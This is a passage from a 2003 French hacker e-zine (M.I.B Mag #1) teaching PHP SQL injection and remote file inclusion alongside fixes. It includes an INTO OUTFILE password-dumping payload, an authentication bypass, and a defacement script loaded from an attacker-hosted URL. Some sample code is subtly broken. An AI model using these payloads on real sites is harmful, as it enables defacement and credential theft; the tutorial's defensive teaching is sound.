<blockquote>
  <p><font color="#CCFFFF"><u>2) Post de news</u></font></p>
</blockquote>
<p><font color="#FFFFFF">Dans certains sites (comme Arenhack.com) ou moteur de 
  recherche laisse la possibilit&eacute; a leurs visiteurs de poster une news 
  ou m&ecirc;me un commentaire. Dans certains scripts, l&#8217;utilisateur doit 
  s&#8217;authentifier ce qui restreint le nombre de personnes ind&eacute;sirables. 
  En revanche il existe encore plusieurs sites qui ne demandent pas d&#8217;authentification. 
  Voici le code vuln&eacute;rable :</font></p>
<table width="94%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">if 
      ( $action==&quot;ajout&quot; ) <br>
      { <br>
      $date=date(&quot;Y/m/d H:i&quot;); <br>
      $ajout_sql = mysql_query(&quot;insert into $table (nom, auteur, email, texte, 
      date) values ('$nom', '$auteur', '$email', '$texte', '$date')&quot;,$connexion); 
      <br>
      } </font></td>
  </tr>
</table>
<p><font color="#FFFFFF">Le formulaire transmet a la page le script une variable 
  &#8216;<font color="#FF0000" size="2" face="Courier New, Courier, mono">hidden</font>&#8217;. 
  Si son contenue est ajout alors le script a pour valeur ajout alors, il va l&#8217;ajouter 
  dans la base de donn&eacute;es SQL. Le nom de la table est variable selon la 
  news et lui correspond donc par exemple si il s&#8217;agit d&#8217;un commentaire 
  sur la new 70 alors le nom de la table pourra &ecirc;tre <font color="#FF0000" size="2" face="Courier New, Courier, mono">new_70</font>.<br>
  Voici la pseudo faille qui peut effectivement para&icirc;tre assez inutile mais 
  assez emb&ecirc;tante pour les webmasters.<br>
  </font></p>
<p><font color="#FFFFFF">L&#8217;attaquant va poster un commentaire &#8216;fant&ocirc;me&#8217; 
  (&#8216;hidden&#8217; vu plus haut), ainsi imaginons que la requ&ecirc;te d&#8217;ajout 
  de news soit :<br>
  </font></p>
<p><font color="#FFFFFF"><a href="http://arenhack/addcommentaire.php?newsID=70&nom=skin&email=skin@arenhack.com&texte=blablabla%20%200wnz%25Thv69">http://arenhack/addcommentaire.php?newsID=70&amp;nom=skin&amp;email=skin@arenhack.com&amp;texte=blablabla 
  %200wnz%Thv69</a><br>
  </font></p>
<p><font color="#FFFFFF">Donc si la news num&eacute;ro 70 existe, alors elle va 
  &ecirc;tre poster, or si elle n&#8217;existe pas elle va quand m&ecirc;me &ecirc;tre 
  poster, ? l&agrave; est le probl&egrave;me!</font></p>
<p><font color="#FFFFFF">Bon, c&#8217;&eacute;tait vraiment un exemple tout con 
  d&#8217;injection, bien sur c&#8217;est extr&ecirc;mement rare de voir un script 
  aussi mal coder, c&#8217;est m&ecirc;me impossible, c&#8217;est juste &agrave; 
  titre d&#8217;exemple !</font></p>
<p><font color="#FFFFFF"><em>Remarque :</em></font></p>
<p><font color="#FFFFFF">Pour ceux qui auraient eu le d&eacute;shonneur de coder 
  ce genre de scripte voici comment le s&eacute;curiser :</font></p>
<table width="32%" height="166" border="1">
  <tr>
    <td><font color="#FF0000" size="2" face="Courier New, Courier, mono">$query = &quot;SELECT * FROM table_news&quot;; <br>
      $requete = mysql_query($query); <br>
      $nb = mysql_numrows($requete); <br>
      if ( ($action==&quot;ajout&quot;) &amp;&amp; ($newsID &lt; $nb) ) <br>
      { <br>
      $date=date(&quot;Y/m/d H:i&quot;); <br>
      $ajout_sql = mysql_query(...); <br>
      } </font></td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<blockquote>
  <p><font color="#CCFFFF">3) <u>Proc&eacute;dure d&#8217;authentification en 
    PHP</u></font></p>
</blockquote>
<p><font color="#FFFFFF">Alors voila je vous expose au faits, on est dans un espace 
  membre donc on est un peut aller tra&icirc;ner dans le fichier <font color="#FF0000" size="2" face="Courier New, Courier, mono">log_admin.php</font> 
  dans le fichier cach&eacute; du site apr&egrave;s avoir rep&eacute;r&eacute; 
  les faille du service PHP. Et on se retrouve devant sa :</font></p>
<table width="49%" border="1">
  <tr>
    <td bgcolor="#000033">
<p><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;?</font></p>
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">include 
        (&laquo; member/config.php) ;<br>
        if($pseudo=&#8217;&#8217; || $password== &#8216;&#8217;)<br>
        {<br>
        [&#8230;]<br>
        exit;<br>
        }<br>
        db_connect();<br>
        $sql= mysql_query(&#8220;SELECT password FROM admin_conf where<br>
        login= &#8216;$pseudo&#8217;&#8221;);<br>
        $nb = mysql_num_rows($sql);</font></p>
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">if($nb 
        == 0)<br>
        {<br>
        echo &#8220;&lt;center&gt;&lt;h3&gt;Mauvais Indentification&lt;/h3&gt;&lt;/center&gt;&#8221;;<br>
        mysql_close();<br>
        exit;<br>
        }<br>
        else<br>
        {<br>
        $sql2 = &#8220;SELECT id_conf FROM admin_conf WHERE login = &#8216;$pseudo&#8217;&#8221;;<br>
        $req2 = mysql_query($sql2) or die(&#8216; Erreur SQL !<br>
        &lt;br&gt;&#8217;.$sql2.&#8217;&lt;br&gt;&#8217;.mysql_error());<br>
        $data2 = mysql_fetch_array($req2);<br>
        mysql_close();<br>
        $id_conf = $data2[&#8216;id_conf&#8217;];<br>
        $expire = 365*24*3600;<br>
        setcookie(&#8220;admin&#8221;,&#8221;$pseudo&#8221;,time()+$expire,&#8221;/&#8221;,&#8221;&#8221;);<br>
        setcookie(&#8220;id_conf&#8221;,&#8221;$id_conf&#8221;,time()+$expire,&#8221;/&#8221;,&#8221;&#8221;);<br>
        session_start();<br>
        session_register(&#8216;pseudo&#8217;);<br>
        session_register(&#8216;admin_id&#8217;);<br>
        $_SESSION[&#8216;log_admin&#8217;] = $pseudo;<br>
        $_SESSION[&#8216;id_admin&#8217;] = $id_conf;<br>
        header(&#8220;Location: _admin/administration.php&#8221;);<br>
        }</font></p>
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">?&gt;</font></p>
</td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<p><font color="#FFFFFF">Bon alors on va faire dans l&#8217;ordre, d&eacute;j&agrave; 
  on voit deux variables qui ne doivent pas &ecirc;tre vides : <font color="#FF0000" size="2" face="Courier New, Courier, mono">$pseudo</font> 
  et <font color="#FF0000" size="2" face="Courier New, Courier, mono">$password</font>. 
  Ensuite on extrait le mot de passe de la table <font color="#FF0000" size="2" face="Courier New, Courier, mono">admin_conf</font> 
  en fonction du <font color="#FF0000" size="2" face="Courier New, Courier, mono">$pseudo</font>, 
  apr&egrave;s si il y a un r&eacute;sultat, donc que le pseudo est un log admin, 
  on extrait l&#8217;<font color="#FF0000" size="2" face="Courier New, Courier, mono">id_conf</font> 
  de l&#8217;admin de la m&ecirc;me table. Mais attention ! Grosse faute du programmeur 
  car le password n&#8217;est pas v&eacute;rifi&eacute; !!! Ainsi si on conna&icirc;t 
  le login de l&#8217;admin, on peut acc&eacute;der dans la zone membre ;)<br>
  Super, mais l&#8217;injection SQL, c&#8217;est pour quand ? ;)<br>
  Dans le fichier <font color="#FF0000" size="2" face="Courier New, Courier, mono">login.php</font>, 
  il y a une possibilit&eacute; d&#8217;injection SQL SI la configuration du serveur 
  Web est <font color="#FF0000" size="2" face="Courier New, Courier, mono">magic_quotes_gpc=OFF</font><br>
  </font></p>
<p><font color="#FFFFFF"><em>Code :</em></font></p>
<table width="44%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">$sql 
      = &laquo; select password from $dbtable where login = &#8216;userlogin&#8217; 
      &raquo; ;<br>
      $req = mysql_query($sql);</font></td>
  </tr>
</table>
<p><font color="#FFFFFF"> <br>
  </font><font color="#FFFFFF">Si on donne a <font color="#FF0000" size="2" face="Courier New, Courier, mono">$userlogin</font> 
  la valeur : &quot;<font color="#FF0000" size="2" face="Courier New, Courier, mono">OR 
  1=1 INTO OUTFILE &#8216;/complete/patch/file.txt</font>&quot; et une valeur 
  quelconque a <font color="#FF0000" face="Courier New, Courier, mono">$password</font>, 
  tous les mots de pass&eacute; seront enregistr&eacute;s dans le fichier /<font color="#FF0000" size="2" face="Courier New, Courier, mono">complete/patch/file.txt</font>.<br>
  Attention ! Enorme faille ! Gr&acirc;ce &agrave; cette injection vous pouvez 
  avoir le mpd de quelqu&#8217;un ! Il suffit d&#8217;ajouter le pseudo au d&eacute;but 
  de la valeur et de virer le &quot;OR 1=1&quot;<br>
  Exemple : <font color="#FF0000" size="2" face="Courier New, Courier, mono">Bob&#8217; INTO OUTFILE&#8217;/complete/patch/file.txt</font></font></p>
<p><font color="#FFFFFF"><em>Les diff&eacute;rentes requ&ecirc;tes li&eacute;es 
  a PHP :</em></font></p>
<table width="22%" border="1">
  <tr>
    <td height="706" bgcolor="#000033"> 
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">mysql_affected_rows 
        <br>
        mysql_change_user <br>
        mysql_close <br>
        mysql_connect <br>
        mysql_create_db <br>
        mysql_data_seek <br>
        mysql_db_name <br>
        mysql_db_query <br>
        mysql_drop_db <br>
        mysql_escape_string <br>
        mysql_fetch_array <br>
        mysql_fetch_assoc <br>
        mysql_fetch_field <br>
        mysql_fetch_lengths <br>
        mysql_fetch_object <br>
        mysql_fetch_row <br>
        mysql_field_flags <br>
        mysql_field_name <br>
        mysql_field_len <br>
        mysql_field_seek <br>
        mysql_field_table <br>
        mysql_field_type <br>
        mysql_free_result <br>
        mysql_get_client_info <br>
        mysql_get_host_info <br>
        mysql_get_proto_info <br>
        mysql_get_server_info <br>
        mysql_insert_id <br>
        mysql_list_dbs <br>
        mysql_list_fields <br>
        mysql_list_tables <br>
        mysql_num_fields <br>
        mysql_num_rows <br>
        mysql_pconnect <br>
        mysql_query <br>
        mysql_result <br>
        mysql_select_db <br>
        mysql_tablename <br>
        mysql_unbuffered_query</font></p>
      </td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><br>
  <strong><u>V. S&eacute;curisation des failles</u></strong><br>
  </font></p>
<p><font color="#FFFFFF">A tout probl&egrave;me existe une solution, enfin presque...rien 
  n&#8217;est impossible en informatique de toute mani&egrave;re.Le principe, 
  comme je l&#8217;es dit dans l&#8217;introduction est filtr&eacute; les donnes 
  rentrantes de fa&ccedil;on a &eacute;vit&eacute; les script malveillant. Pr&eacute;noms 
  un exemple simple :<br>
  J&#8217;ai un formulaire qui me demande mon nom de famille, donc si je met des 
  chiffres sa va sembler bizarre non ? (A moins que me m&#8217;appelle C3PO, mais 
  bon c&#8217;est rare...?).<br>
  Donc pour r&eacute;soudre ce probl&egrave;me, il y a plusieurs m&eacute;thodes 
  qui s&#8217;offre a vous :</font></p>
<p><font color="#FFFFFF">- Soit s&eacute;curiser avec du javascript au niveau 
  du client, v&eacute;rification du champs &laquo; nom &raquo; et si ce champs 
  contient des chiffres alors il est refus&eacute;.Comme par exemple :</font></p>
<table width="40%" border="1">
  <tr>
    <td bgcolor="#000033">
<p><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;SCRIPT 
        LANGUAGE=&quot;JavaScript&quot;&gt; <br>
        function checkstring(text){ <br>
        pat=/^[A-Za-z0-9]{6,10}$/; <br>
        result=text.match(pat); <br>
        return TRUE; <br>
        } </font></p>
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">function 
        Send(){ <br>
        if (checkstring(txtName) &amp;&amp; checkstring(txtPassword)){ <br>
        login.submit(); <br>
        } <br>
        } <br>
        &lt;/SCRIPT&gt;</font></p>
</td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<p><font color="#FFFFFF">Le but &eacute;tant d&#8217;enlever les caract&egrave;res 
  dangereux.</font></p>
<p><font color="#FFFFFF">Mais ce n&#8217;est vraiment pas une bonne id&eacute;e 
  d&#8217;utiliser ce genre de script car il peut &ecirc;tre lui m&ecirc;me d&eacute;tourner 
  par un autre script.<br>
  Mais ce n&#8217;est pas la seul contrainte de ce genre de s&eacute;curit&eacute; 
  car supposons que le formulaire envoie des donn&eacute;es en POST, si nous remplissons 
  le formulaire avec des caract&egrave;res non conformes le script va fonctionner. 
  Mais maintenant, si on fait un syst&egrave;me, c'est-&agrave;-dire que lieu 
  de remplir directement le formulaire, on envoie directement les variables avec 
  quelque chose comme &ccedil;a : <font color="#FF0000" size="2" face="Courier New, Courier, mono">formulaire.php ?=cequevousvoulez</font>, 
  la variable sera interpr&eacute;ter par le serveur et non pas par le client.<br>
  Donc cette s&eacute;curit&eacute; est vraiment inefficace, je vous conseil de 
  directement s&eacute;curiser au niveau du serveur.</font></p>
<p><font color="#FFFFFF">- Maintenant parlons de la s&eacute;curit&eacute; la 
  plus s&ucirc;r, c&#8217;est notre script PHP qui va analyser les donn&eacute;es 
  entr&eacute;es. Et si elles sont non conformes, il les refuse et envoie un message 
  d&#8217;erreur.</font></p>
<p><font color="#FFFFFF">- Mais le mieux est encore de s&eacute;curis&eacute; 
  au 2 niveau, c'est-&agrave;-dire au niveau du client et au niveau du serveur, 
  c&#8217;est le moyen le plus s&ucirc;re. Mais si il y a un conseil que je peux 
  donn&eacute;e au webdevelopper, c&#8217;est de ne pas sous estimer cette faille 
  car elle peut faire tr&egrave;s mal?.</font></p>
<p><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF"><strong><u>VI. Conclusion</u></strong><br>
  </font></p>
<p><font color="#FFFFFF">J&#8217;ai pu vous d&eacute;montrez dans cette article 
  que les bases de donn&eacute;es SQL sont tr&egrave;s facilement piratable en 
  connaissance de quelques information sur les diff&eacute;rente tables/champs. 
  Bien entendu les faille de se genre se font de plus en plus rare car les webmasters 
  sont vigilent. Tout de m&ecirc;me certaines injection reste possible, vous pouvez 
  vous en rendre compte sur www.security-corporation.com qui reste &agrave; jour 
  sur toute les nouvelles failles, injection et techniques de buffer overflow 
  (US). </font></p>
<p>&nbsp;</p>
<p><font color="#FFFFFF"><strong><u>VII. Inspiration, Sources, Remerciement</u></strong></font><font color="#FFFFFF"><br>
  </font></p>
<p><font color="#FFFFFF"><em>Inspiration de d&eacute;part</em> : <font color="#FFCC00">Hackademy 
  manuel n&deg;5</font><br>
  <em>Quelques sources</em> : <font color="#FFCC00">Hackademy journal n&deg;11, 
  tutorial de Crazy Lord //SQL hacking, tutorial de Memonix //SQL #1</font><br>
  <em>Remerciements</em> : SpS6m3N pour m&#8217;avoir donner quelques sources 
  de tutoriaux et Nocte qui m&#8217;a redonn&eacute; confiance en moi.</font></p>
<p><font color="#FFFFFF" size="5" face="Monotype Corsiva">Skin</font></p>
<p><font color="#FFFFFF" size="3" face="Times New Roman, Times, serif">Copyright 
  &copy; 2003 Arenhack</font></p>
<p>&nbsp;</p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font> 
  <font color="#FFFFFF"><br>
  </font></p>
<p align="center">&nbsp;</p>
<p align="center"><font color="#000000">----</font><font color="#000000">--</font><font color="#FF0000">/~~~~~~~~~~~~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">Include Vulnerability</font></strong><font color="#FF0000">-| 
  &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~~~~~~~~~~~~~~/</font></p>
<p align="center">&nbsp;</p>
<p align="left"><font color="#FFFFFF"><u>SOMMAIRE :</u></font></p>
<p><font color="#FFFFFF"><strong><u>I. Inclusion d'une autre page. <br>
  II. Inclusion de variables. <br>
  III. Exploitation. <br>
  IV. S&eacute;curit&eacute; </u></strong><u><br>
  <font color="#000000">_</font> <font color="#CCFFFF">1) Contr&ocirc;le de la 
  variable. </font></u></font></p>
<p><font color="#FFFFFF"><br>
  La faille dite d'include est tres courante sur les sites php. L'include sert 
  principalement &agrave; inclure une page dans une autre pour faciliter les mises 
  &agrave; jour par exemple ou encore plus fr&eacute;quament &agrave; inclure 
  des variables provenants d'un fichier de configuration. </font></p>
<p><font color="#FFFFFF">I. Inclusion d'une autre page. </font></p>
<table width="13%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? 
      <br>
      include($page); <br>
      ?&gt; </font></td>
  </tr>
</table>
<p><font color="#FFFFFF">Dans un code html : </font></p>
<table width="59%" border="1">
  <tr>
    <td bgcolor="#000033">
<p><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;html&gt; 
        <br>
        &lt;head&gt; <br>
        &lt;title&gt;Page1&lt;/title&gt; <br>
        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; 
        charset=iso-8859-1&quot;&gt; <br>
        &lt;/head&gt; </font></p>
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;body&gt; 
        <br>
        [color=red]&lt;? include(&quot;maj.php&quot;); ?&gt; [/color]// La page 
        que nous incluons dans page1.php <br>
        &lt;/body&gt; <br>
        &lt;/html&gt; </font></p>
</td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<p><font color="#FFFFFF">II. nclusion de variables</font></p>
<table width="46%" border="1">
  <tr>
    <td bgcolor="#000033"> 
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? 
        <br>
        //------------------------------------------------ <br>
        //------------- Page config.php --------------- <br>
        //-----------------------------------------------<br>
        $login = &quot;admin&quot;; <br>
        $pass = &quot;pass&quot;; <br>
        //-------------------- END --------------------- <br>
        ?&gt; </font></p> <p>&nbsp;</p> <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? 
        <br>
        //---------------------------------------------------<br>
        //------------- Page protec.php --------------- <br>
        //--------------------------------------------------- <br>
        include(&quot;config.php&quot;); // La page config.php ou sont stok&eacute;s 
        les variables </font></p> <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">if($good1==$login 
        &amp; $good2==$pass) <br>
        { <br>
        include (&quot;identification_ok.php&quot;); // si le login et le pass 
        est identique au config.php <br>
        } <br>
        else <br>
        { <br>
        echo &quot;&lt;center&gt;Mauvais login/pass&lt;/center&gt;&lt;br&gt;&quot;; 
        <br>
        include (&quot;admin.php&quot;); <br>
        } <br>
        //-------------------- END -----------------------<br>
        ?&gt; </font></p>
      <p></p>
</td>
  </tr>
</table>
<p><font color="#FFFFFF"><br>
  </font><font color="#FFFFFF">NB </font><font color="#FFFFFF">: la fonction include() 
  est quasiment identique &agrave; require() </font></p>
<p><font color="#FFFFFF">Voil&agrave; pour les principales utilisations de l'include 
  en php. <br>
  Si l'utilisateur se limite au donn&eacute;s transmises grace &agrave; ces includes 
  sans les modifier, il n'y a aucun probl&egrave;me. Mais s'il les modifient (Par 
  exemple: <a href="http://www.lesite.com/page.php?page=.htpsswrd">http://www.lesite.com/page.php?page=.htpsswrd</a>) 
  il a acc&eacute;s &agrave; un grand nombre d'informations et peut par la meme 
  occasion d&eacute;facer le site. <br>
  Pour trouver la faille il suffit d'essayer d'inclure une URL : <a href="http://www.lesite.com/page.php?page=http://www.google.com">http://www.lesite.com/page.php?page=http://www.google.com</a>. 
  Si on arrive sur une <strong>erreur 404</strong>, c'est que la faille semble 
  &ecirc;tre prot&eacute;g&eacute;e. Si au contraire la page d'acceuil de google 
  est include dans la page du site c'est qu'elle est pr&eacute;sente ! </font></p>
<p><font color="#FFFFFF">III. Exploitation</font></p>
<p><font color="#FFFFFF">Imaginons que le test pr&eacute;c&eacute;dent ai fonctionn&eacute; 
  et que google s'est affich&eacute; au beau milieu de la page du site. Le pirate 
  va uploder sur un compte web perso un script du type :</font></p>
<table width="40%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? 
      <br>
      //-------------Hack.php-------------- <br>
      $fp=fopen(&quot;index.php&quot;, w); <br>
      $msg=&quot;Le message qu'il veut mettre en en tete du site&quot;; <br>
      fwrite($fp,$msg); <br>
      fclose($fp); <br>
      ?&gt; </font></td>
  </tr>
</table>
<p><font color="#FFFFFF"></font></p>
<p><font color="#FFFFFF">Il va ensuite &quot;l'inclure&quot; dans le site &agrave; 
  d&eacute;facer : <a href="http://www.lesite.com/page.php?page=http://le_site_du_pirate.free.fr/hack.php%20">http://www.lesite.com/page.php?page=http://le_site_du_pirate.free.fr/hack.php 
  </a> </font></p>
<p><font color="#FFFFFF">Normalement, si tout c'est bien pass&eacute;, le message 
  devrait &ecirc;tre inscrit sur la page d'acceuil du site. Naturellement il est 
  tout &agrave; fait possible d'y mettre du html... </font></p>
<p><font color="#FFFFFF"><br>
  IV. S&eacute;curit&eacute; </font></p>
<p><font color="#FFFFFF"><br>
  Il ne faut pas oublier d'aller v&eacute;rifier dans le fichier <font color="#FF0000" size="2" face="Courier New, Courier, mono">php.ini</font> 
  que <font color="#FF0000" size="2" face="Courier New, Courier, mono">allow_url_fopen</font> soit sur off pour empecher 
  l''inclusion de donn&eacute;es externes. </font></p>
<p><font color="#FFFFFF">En premier , rappelons la syntaxe de la fonction include 
  dans le script : (cas des pseudos frames) </font></p>
<table width="40%" border="1">
  <tr>
    <td bgcolor="#000033"><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? 
      <br>
      $fp=fopen(&quot;la page.php&quot;, w); <br>
      if(file_exists($page)) //si la variable($) page existe <br>
      { <br>
      include($page); //alors on l'inclue <br>
      } <br>
      else <br>
      { <br>
      include (&quot;404.php&quot;); // on inclue une page d'erreur. <br>
      } <br>
      ?&gt; </font></td>
  </tr>
</table>
<p><font color="#FFFFFF"><br>
  </font><font color="#FFFFFF">Donc une premiere methode de s&eacute;curisation 
  consiste &agrave; ajouter l'extention .php apres la variable d'include tel que 
  <font color="#FF0000" size="2" face="Courier New, Courier, mono">$page = $page..php</font>; </font></p>
<p><font color="#FFFFFF">Donc en reprenant l'example plus haut : <a href="www.lesite.com/page.php?page=http://le_site_du_pirate.free.fr/hack.php%20">www.lesite.com/page.php?page=http://le_site_du_pirate.free.fr/hack.php 
  </a> </font></p>
<p><font color="#FFFFFF">Cette url conduira desormais &agrave; une <strong>erreure 
  404</strong> vue que .php sera rajout&eacute; &agrave; la fin de l'URL ( <font color="#FF0000" size="2" face="Courier New, Courier, mono">../hack.php.php</font> 
  ) . <br>
  </font></p>
<p><font color="#FFFFFF">Le probl&egrave;me , c'est que si on ecrit : <a href="http://www.lesite.com/page.php?page=http://le_site_du_pirate.free.fr/hack.php%20">www.lesite.com/page.php?page=http://le_site_du_pirate.free.fr/hack 
  </a> </font></p>
<p><font color="#FFFFFF">.php sera encore rajout&eacute; &agrave; la fin de l'URL 
  et cette fois &ccedil;i , la page sera bien incluse ! </font></p>
<p><font color="#FFFFFF">Par contre cette securite , sans interdire totalement 
  l'injection de code , empeche l'acc&eacute;s aux fichiers sensibles tel que 
  <font color="#FF0000" size="2" face="Courier New, Courier, mono">.htaccess .htpasswd</font> 
  ... </font></p>
<p><font color="#FFFFFF"><br>
  <font color="#CCFFFF"><u>1) Contr&ocirc;le de la variable</u></font></font></p>
<table width="58%" border="1">
  <tr> 
      
    <td bgcolor="#000033">
<p><font color="#FF0000" size="2" face="Courier New, Courier, mono">&lt;? <br>
        switch ($page) { <br>
        case &quot;page1.php&quot;: <br>
        case &quot;page2.php&quot;: <br>
        case &quot;pages/page.php&quot;: <br>
        include($page); <br>
        break; </font></p>
      <p><font color="#FF0000" size="2" face="Courier New, Courier, mono">default: 
        <br>
        exit(&quot;404&quot;); // Si la variable ne correspond ni &agrave; &quot;page1&quot; 
        ni a &quot;page2&quot; ni a &quot;pages/page.php&quot; <br>
        } <br>
        ?&gt; </font></p>
</td>
    </tr>
  </table>
<p><u><font color="#CCFFFF"></font></u></p>
<p><font color="#FFFFFF" size="5" face="Monotype Corsiva">Sps6m3n</font></p>
<p><font color="#FFFFFF">Copyright &copy; 2003 ArenHack</font></p>
<blockquote> 
  <p><font color="#FFFFFF"></font></p>
</blockquote>
<p><font color="#FFFFFF"><br>
  </font></p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font> 
  <font color="#FFFFFF"><br>
  </font></p>
<p align="center">&nbsp;</p>
<p align="center"><font color="#000000">----</font><font color="#000000">--</font><font color="#FF0000">/~~~~~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">To Conclude</font></strong><font color="#FF0000">-| 
  &gt;=--</font> <br>
  <font color="#000000">------</font><font color="#FF0000">\~~~~~~~~~~~~/</font></p>
<p align="left"><font color="#FFFFFF">Et voil&agrave; ce premier num&eacute;ro 
  de M.I.B Mag est fini, nous esp&eacute;rons qu'il aura satisfait vos attentes 
  autant au niveau du contenu que de la forme. ArenHack Team reviendra dans M.I.B 
  Mag #2 qui devrait sortir &agrave; la fin des prochaines vacances. Au programme 
  : 2&egrave;me partie de l'introduction &agrave; TCP/IP, la s&eacute;curit&eacute; 
  sous FreeBSD, le tunneling... Enfin que du bon quoi. Merci &agrave; tous ceux 
  qui nous soutiennent et qui nous permettent d'&eacute;voluer, nous pensons bien 
  sur &agrave; Nocte de DHS Team dont la connaissance et les conseils nous sont 
  plus que pr&eacute;cieux, un grand merci &agrave; lui sans qui nous nous serions 
  peut-etre &eacute;gar&eacute; dans cette aventure.</font></p>
<p align="left"><font color="#FFFFFF">Pour conclure nous citerons Omar Kheyyam 
  qui a dit :</font></p>
<p align="center"><font color="#FFFFFF">&quot;<em><font size="4" face="Monotype Corsiva">Avant 
  notre venue, rien ne manquait au monde ; apr&egrave;s notre d&eacute;part rien 
  ne lui manquera...</font></em>&quot;</font></p>
<p align="left"><font color="#FFFFFF" size="3" face="Times New Roman, Times, serif">Nous 
  sommes d'accord avec la seconde partie...</font></p>
<p align="center"><font color="#FFFFFF"><a href="http://www.ArenHack.com"><img src="M.I.B%20Mag%20#1_fichiers/BA.jpg" width="468" height="60" border="0"></a></font> 
</p>
<p align="center"></p>
<p align="center"><font color="#FFFFFF">_________________________________________________________________________________________________________</font> 
  <font color="#FFFFFF"><br>
  </font></p>
<p align="center"><font color="#000000">-</font><font color="#000000">-----</font><font color="#FF0000">/~~~~~~~~\</font><br>
  <font color="#000000">-------</font><font color="#FF0000">--=&lt; |-</font> 
  <strong><font color="#FFFFFF" size="4">Cr&eacute;dits</font></strong><font color="#FF0000">-| 
  &gt;=--</font> <br>
  <font color="#000000">-------</font><font color="#FF0000">\~~~~~~~~/</font> 
</p>
<p align="left"><font color="#FFFFFF" face="Arial, Helvetica, sans-serif"><u>R&eacute;dacteur 
  en chef M.I.B Mag #1</u> : <font face="Garamond"><strong>CL@D</strong></font></font> 
  <font color="#FFFFFF" face="Garamond"><strong>=&gt; cladealer@msn.com</strong></font></p>
<p align="left"><font color="#FFFFFF" face="Arial, Helvetica, sans-serif"><u>Autres 
  r&eacute;dacteurs</u> : <strong><font face="Garamond">_JaCkEr =&gt;krypter@club-internet.fr</font></strong></font></p>
<p align="left"><strong><font color="#000000" face="Garamond">_________________<font color="#FFFFFF">_Skin 
  =&gt;skino2600@hotmail.com</font></font></strong></p>
<p align="left"><strong><font color="#000000" face="Garamond">_________________<font color="#FFFFFF">_TheTchesk 
  =&gt;thetchesk@hotmail.com</font></font></strong></p>
<p align="left"><strong><font color="#000000" face="Garamond">_________________<font color="#FFFFFF">_Nocte 
  =&gt;slickers@6sens.com</font></font></strong></p>
<p align="left"><strong><font color="#000000" face="Garamond">_________________<font color="#FFFFFF">_SpS6m3n 
  =&gt;sps6m3n@arenhack.com</font></font></strong> </p>
<p align="left"><font color="#FFFFFF" face="Arial, Helvetica, sans-serif"><u>Webmaster 
  ArenHack</u> : <strong><font face="Garamond">SpS6m3n</font></strong></font></p>
<p align="right"><em><font color="#FFFFFF" size="4" face="Monotype Corsiva">Une 
  id&eacute;e de SpS6m3n</font></em></p>
<p align="right"></p>
<p align="right"></p>
<p align="center"><font color="#FFFFFF" size="3" face="Verdana, Arial, Helvetica, sans-serif">Copyright 
  &copy; 2003 ArenHack</font></p>
</body>
</html>
